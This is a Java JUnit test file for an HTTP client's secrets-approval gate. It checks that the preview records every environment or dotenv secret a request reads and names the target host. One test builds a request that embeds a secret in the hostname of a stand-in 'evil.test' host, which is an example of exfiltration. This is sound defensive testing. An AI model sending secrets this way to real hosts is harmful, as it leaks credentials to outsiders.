package com.editora.http;

import java.nio.file.Files;
import java.nio.file.Path;
import java.time.ZonedDateTime;
import java.util.List;
import java.util.Map;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertTimeoutPreemptively;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * The dry resolution the secrets gate asks from ({@link SecretApproval#preview}): it records exactly the secret
 * sources a send reads, whatever the form or the indirection, keeps their values out of what it returns, and
 * names the host the request goes to. {@code PATH} stands in for a secret: every platform has it.
 */
class HttpSecretPreviewTest {

    private static final String SECRET = System.getenv("PATH");

    private static HttpFile.Parsed request(String text) {
        return HttpFile.parseRequest(HttpFile.parse(text).get(0));
    }

    private static SecretApproval.Preview preview(String text) {
        return SecretApproval.preview(request(text), Map.of(), null, null);
    }

    @Test
    void theGateAsksAboutExactlyTheNamesTheResolverReadsTheEnvironmentFor() {
        assertTrue(SECRET != null && !SECRET.isEmpty());
        ZonedDateTime now = ZonedDateTime.now();
        List<String> reads = List.of("$processEnv PATH", "$processEnv.PATH", "$env.PATH", "$env PATH", " $env PATH ");
        for (String name : reads) {
            assertTrue(DynamicVars.isSecretSource(name), name);
            assertEquals(SECRET, DynamicVars.value(name, now, null), name + " reads the environment");
        }
        List<String> notReads =
                List.of("$envPATH", "$env\tPATH", "$ENV PATH", "$processenv PATH", "$env:PATH", "env PATH");
        for (String name : notReads) {
            assertFalse(DynamicVars.isSecretSource(name), name);
            assertNotEquals(SECRET, DynamicVars.value(name, now, null), name + " must not read the environment");
        }
        assertTrue(DynamicVars.isSecretSource("$dotenv KEY"));
        assertTrue(DynamicVars.isSecretSource("$dotenv.KEY"));
    }

    @Test
    void everyFormAndBraceShapeIsRecordedAsWritten() {
        assertEquals(
                List.of("$env PATH"),
                preview("GET http://h.test/?k={{$env PATH}}\n").reads());
        assertEquals(
                List.of("$env PATH"),
                preview("GET http://h.test/?k={{  $env PATH  }}\n").reads());
        assertEquals(
                List.of("$processEnv PATH"),
                preview("GET http://h.test/?k={{{$processEnv PATH}}}\n").reads());
        assertEquals(
                List.of("$processEnv PATH"),
                preview("GET http://h.test/?k={{{{$processEnv PATH}}\n").reads());
        assertEquals(
                List.of("$dotenv.KEY"),
                preview("GET http://h.test/?k={{$dotenv.KEY}}\n").reads());
        assertEquals(
                List.of("$env.PATH"),
                preview("GET http://h.test/\nAuthorization: Basic {{$env.PATH}} x\n")
                        .reads());
        assertEquals(
                List.of("$env PATH"),
                preview("GET http://h.test/\n\n>> out-{{$env PATH}}.txt\n").reads());
        assertEquals(
                List.of(),
                preview("GET http://h.test/?k={{$uuid}}&t={{$timestamp}}\n").reads());
    }

    @Test
    void indirectionThroughVariablesAndEnvironmentValuesIsFollowedOnlyWhereUsed() {
        assertEquals(
                List.of("$env PATH"),
                preview("@a = {{$env PATH}}\n@b = x{{a}}\nGET http://h.test/?k={{b}}\n")
                        .reads());
        assertEquals(
                List.of(), preview("@a = {{$env PATH}}\nGET http://h.test/\n").reads(), "declared, never used");
        Map<String, String> env = Map.of("a", "{{$processEnv PATH}}", "b", "{{a}}/x", "unused", "{{$dotenv K}}");
        SecretApproval.Preview p = SecretApproval.preview(request("GET http://h.test/?k={{b}}\n"), env, null, null);
        assertEquals(List.of("$processEnv PATH"), p.reads());
    }

    @Test
    void substitutedBodyFilesAndMultipartPartsAreRead(@TempDir Path dir) throws Exception {
        Files.writeString(dir.resolve("body.txt"), "k={{$env PATH}}");
        Files.writeString(dir.resolve("part.txt"), "secret={{$processEnv PATH}}");
        SecretApproval.Preview body = SecretApproval.preview(
                request("POST http://h.test/\nContent-Type: text/plain\n\n<@ ./body.txt\n"), Map.of(), dir, null);
        assertEquals(List.of("$env PATH"), body.reads());
        SecretApproval.Preview part = SecretApproval.preview(
                request("POST http://h.test/\nContent-Type: multipart/form-data; boundary=b\n\n--b\n"
                        + "Content-Disposition: form-data; name=\"f\"\n\n<@ ./part.txt\n--b--\n"),
                Map.of(),
                dir,
                null);
        assertEquals(List.of("$processEnv PATH"), part.reads());
    }

    @Test
    void theHostIsTheOneTheRequestGoesToAndNeverShowsTheValue() {
        assertEquals(
                List.of("127.0.0.1:9"),
                preview("@base = http://127.0.0.1:9\nGET {{base}}/x?k={{$env PATH}}\n")
                        .hosts());
        assertEquals(
                List.of("api.test:8080"),
                preview("GET /x?k={{$env PATH}}\nHost: api.test:8080\n").hosts());
        SecretApproval.Preview inHost = preview("GET http://{{$env PATH}}.evil.test/\n");
        assertEquals(List.of("$env PATH"), inHost.reads());
        assertFalse(inHost.hosts().get(0).contains(SECRET), inHost.hosts().toString());
        assertEquals("{{$env PATH}}.evil.test", inHost.hosts().get(0));
        assertEquals("h.test", HttpHosts.authority("https://user:pw@h.test/p?q#f"));
    }

    @Test
    void theRealSendRecordsTheSameReads() {
        ZonedDateTime now = ZonedDateTime.now();
        HttpVars.Unresolved sink = new HttpVars.Unresolved();
        HttpVars.Scope scope = HttpVars.scope(Map.of("e", "{{$env PATH}}"), List.of(), now, null, null);
        String sent = HttpVars.substitute("{{{e}}}", scope, now, null, null, sink);
        assertEquals("{" + SECRET + "}", sent, "the value is sent (once allowed)");
        assertEquals(List.of("$env PATH"), sink.secretReads(), "and recorded through the environment value");
    }

    @Test
    void pathologicalBracesAreScannedInLinearTime() {
        String text = "GET http://h.test/\nContent-Type: text/plain\n\nx {{" + " ".repeat(200_000) + "\n";
        assertTimeoutPreemptively(java.time.Duration.ofSeconds(5), () -> preview(text));
    }

    @Test
    void thePreviewSaysWhetherTheRequestIsSentAndWhetherItsHostIsKnownBeforehand() {
        SecretApproval.Preview plain = preview("GET http://h.test/?k={{$env PATH}}\n");
        assertTrue(plain.sendable());
        assertFalse(plain.hostFromResponse());
        assertFalse(plain.hostUnfixed());
        assertFalse(
                preview("GRAPHQL http://h.test/?k={{$env PATH}}\n\nquery { a }\n")
                        .sendable(),
                "never sent");
        SecretApproval.Preview chained =
                preview("@base = {{login.response.body.$.next}}\nGET {{base}}?k={{$env PATH}}\n");
        assertTrue(chained.hostFromResponse(), "a host an earlier response chooses, through an @var line");
        assertTrue(chained.hostUnfixed());
        assertTrue(preview("GET http://{{$env HOST}}/?k=1\n").hostUnfixed(), "a host made of a secret");
        assertTrue(
                preview("GET /p\nHost: {{$random.alphabetic(5)}}.h.test\n").hostUnfixed(), "a fresh value each time");
        assertFalse(preview("GET http://h.test/{{login.response.body.$.id}}\n").hostUnfixed(), "only the path");
    }
}
